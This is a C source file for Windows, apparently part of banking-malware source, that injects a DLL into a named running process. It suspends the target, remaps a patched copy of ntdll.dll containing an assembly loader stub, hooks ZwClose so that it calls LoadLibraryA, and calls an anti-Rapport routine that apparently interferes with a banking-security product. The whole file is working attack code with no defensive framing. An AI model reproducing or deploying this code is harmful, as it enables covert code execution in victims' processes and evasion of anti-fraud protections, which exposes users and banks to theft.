#include <intrin.h>
#include <windows.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "ntdll.h"

#include "injntdll.h"
#include "utilsu.h"
#include "splice.h"
#include "antirapport.h"

DWORD InjnGetPidByName(LPCSTR lpProcessName, DWORD dwNPid)
{
	DWORD dwRet = 0;
	PROCESSENTRY32 ProcEntry = {0};
	HANDLE hSnap;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap)
	{
		ProcEntry.dwSize = sizeof(ProcEntry);
		if (Process32First(hSnap, &ProcEntry))
		{
			do
			{
				if (ProcEntry.th32ProcessID != GetCurrentProcessId() && dwNPid != ProcEntry.th32ProcessID)
				{
					if (!_stricmp(lpProcessName, ProcEntry.szExeFile))
					{
						dwRet = ProcEntry.th32ProcessID;

						break;					
					}
				}
			} 
			while (Process32Next(hSnap, &ProcEntry));
		}
		else
		{
			UtiDPrint(__FUNCTION__"(): Process32First fails; last error: %x\n", GetLastError());
		}

		CloseHandle(hSnap);	
	}
	else
	{
		UtiDPrint(__FUNCTION__"(): CreateToolhelp32Snapshot fails; last error: %x\n", GetLastError());
	}

	return dwRet;
}

__declspec(naked) VOID injn_dllloader_start()
{
	__asm
	{
		mov eax,0x11111111
		xor cl,cl
		cmp byte ptr [eax], cl
		jz exit_
		mov byte ptr [eax], cl
		inc eax
		push eax
		mov eax, 0x22222222
		call eax
exit_:
		mov eax, 0x33333333
		jmp eax
	}
}

__declspec(naked) VOID injn_dllloader_end(){__asm __emit 'J'}

#define injn_dllloader_size	(DWORD)injn_dllloader_end-(DWORD)injn_dllloader_start

typedef struct _SHELL_DATA
{
	DWORD dwSize;
	UCHAR ucOldBytes[OLD_BYTES_SIZE];
	BYTE bLock;
	CHAR chDllName[1];
} 
SHELL_DATA, *PSHELL_DATA;

DWORD InjnFreeSpaceInHeader(PVOID pvPEBase, PVOID *pSpace)
{
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)RtlImageNtHeader(pvPEBase);

	if (pNtHeaders)
	{
		PIMAGE_SECTION_HEADER pFirstSection = IMAGE_FIRST_SECTION(pNtHeaders);

		*pSpace = &pFirstSection[pNtHeaders->FileHeader.NumberOfSections];
		return (pFirstSection->PointerToRawData - ((DWORD)pFirstSection - (DWORD)pvPEBase) - (pNtHeaders->FileHeader.NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER));
	}

	return 0;
}

VOID InjnFixDWORD(BYTE *Data,DWORD Size,DWORD Old,DWORD New)
{
	DWORD p = 0;
	PDWORD pDD;

	while (p < Size)
	{
		pDD = (PDWORD)(Data + p);
		if (*pDD == Old) *(DWORD*)(Data + p) = New;

		p++;
	}
}

VOID InjnProcDllUnhook()
{
	PVOID pvNtllBase = GetModuleHandle("ntdll.dll");
	PVOID pvSpace;
	
	if (InjnFreeSpaceInHeader(pvNtllBase, &pvSpace))
	{
		PSHELL_DATA pShellData = MAKE_PTR(pvSpace, injn_dllloader_size, PSHELL_DATA);

		Unsplice(GetProcAddress((HMODULE)pvNtllBase, "ZwClose"), &pShellData->ucOldBytes);
		Sleep(3000);
		ZeroMemory(pvSpace, pShellData->dwSize);
	}
}

BOOL InjnProcDllHook(LPCSTR lpProcessName, LPCSTR lpDllPath, PDWORD pdwInj)
{
	BOOL bRet = FALSE;
	DWORD dwPid;
	HANDLE hProcess;
	NTSTATUS St;

	*pdwInj = dwPid = InjnGetPidByName(lpProcessName, *pdwInj);
	if (dwPid)
	{
		hProcess = OpenProcess(PROCESS_SUSPEND_RESUME|PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, FALSE, dwPid);
		if (hProcess != INVALID_HANDLE_VALUE)
		{
			St = NtSuspendProcess(hProcess);
			if (NT_SUCCESS(St))
			{
				DWORD dwLen = strlen(lpDllPath) + 1;
				PVOID pvNtllBase = GetModuleHandle("ntdll.dll");
				DWORD dwNtDllSize = ((PIMAGE_NT_HEADERS)RtlImageNtHeader(pvNtllBase))->OptionalHeader.SizeOfImage;
				DWORD dwNeeded = dwLen + sizeof(SHELL_DATA) + injn_dllloader_size;
				DWORD dwReaded;
				HANDLE hMap;
				PVOID pMap;
				PVOID pvSpace;
				
				hMap = CreateFileMapping(0, NULL, PAGE_EXECUTE_READWRITE, 0, dwNtDllSize, NULL);
				if (hMap != INVALID_HANDLE_VALUE)
				{
					pMap = MapViewOfFile(hMap, FILE_MAP_WRITE|FILE_MAP_READ, 0, 0, dwNtDllSize);
					if (pMap)
					{
						if (ReadProcessMemory(hProcess, pvNtllBase, pMap, dwNtDllSize, &dwReaded))
						{
							if (InjnFreeSpaceInHeader(pMap, &pvSpace) > dwNeeded)
							{
								UCHAR ucLoader[1024];

								CopyMemory(ucLoader, injn_dllloader_start, injn_dllloader_size);

								PSHELL_DATA pShellData = MAKE_PTR(pvSpace, injn_dllloader_size, PSHELL_DATA);
								CopyMemory(pShellData->chDllName, lpDllPath, dwLen);
								pShellData->bLock = TRUE;
								pShellData->dwSize = dwNeeded;

								InjnFixDWORD(ucLoader, injn_dllloader_size, 0x11111111, (DWORD)RtlOffsetToPointer(pvNtllBase, RtlPointerToOffset(pMap, &pShellData->bLock)));
								InjnFixDWORD(ucLoader, injn_dllloader_size, 0x22222222, (DWORD)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"));
								InjnFixDWORD(ucLoader, injn_dllloader_size, 0x33333333, (DWORD)RtlOffsetToPointer(pvNtllBase, RtlPointerToOffset(pMap, &pShellData->ucOldBytes)));

								CopyMemory(pvSpace, ucLoader, injn_dllloader_size);

								PVOID pvAddr = RtlOffsetToPointer(pMap, RtlPointerToOffset(pvNtllBase, GetProcAddress((HMODULE)pvNtllBase, "ZwClose")));
								Splice(pvAddr, pvSpace, &pShellData->ucOldBytes);

								St = NtUnmapViewOfSection(hProcess, pvNtllBase);
								if (NT_SUCCESS(St))
								{
									St = NtMapViewOfSection(hMap, hProcess, &pvNtllBase, 0, 0, NULL, &dwNtDllSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
									if (NT_SUCCESS(St))
									{
										bRet = TRUE;
									}
									else
									{
										UtiDPrint(__FUNCTION__"(): NtMapViewOfSection fails; st: %x\n", St);
									}
								}
								else
								{
									UtiDPrint(__FUNCTION__"(): NtUnmapViewOfSection fails; st: %x\n", St);
								}
							}
						}
						else
						{
							UtiDPrint(__FUNCTION__"(): ReadProcessMemory fails; last error: %x\n", GetLastError());
						}

						UnmapViewOfFile(pMap);
					}

					CloseHandle(hMap);
				}

				AntiRapControlThreads(hProcess, dwPid);
			}
			else
			{
				UtiDPrint(__FUNCTION__"(): NtSuspendProcess fails; st: %x\n", St);
			}

			CloseHandle(hProcess);
		}
		else
		{
			UtiDPrint(__FUNCTION__"(): OpenProcess fails; last error: %x\n", GetLastError());
		}
	}
	else
	{
		UtiDPrint(__FUNCTION__"(): GetProcessIdByName fails\n");
	}

	return bRet;
}